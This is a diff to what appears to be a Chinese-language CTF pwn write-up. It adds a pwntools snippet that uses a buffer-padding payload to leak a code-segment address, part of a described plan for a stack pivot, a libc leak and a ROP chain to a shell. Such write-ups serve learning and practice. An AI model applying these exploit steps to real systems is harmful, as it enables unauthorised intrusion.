@@ -199,7 +199,17 @@ shell:
 第二次循环，用puts函数泄漏stack段的地址，然后开始构造栈迁移并泄漏libc，然后构造ROP获取shell。
 下面是逐步分析。
 第一步，泄漏code段地址
-``
+```python
+# payload1泄漏code段地址
+payload1 = b'a' * (0x28 - 1) + b'b'
+p.sendafter('name: ', payload1)
+p.recvuntil(b'ab')
+func_addr = u64(p.recv(6).ljust(8, b'\x00'))
+func_base = func_addr - 0x10138d
+```
+![[Pasted image 20250211192422.png]]
+将前面填充后可以看到泄漏了code段的地址，p
+![[Pasted image 20250211192517.png]]
 ## unjoke
 
 ## Natro
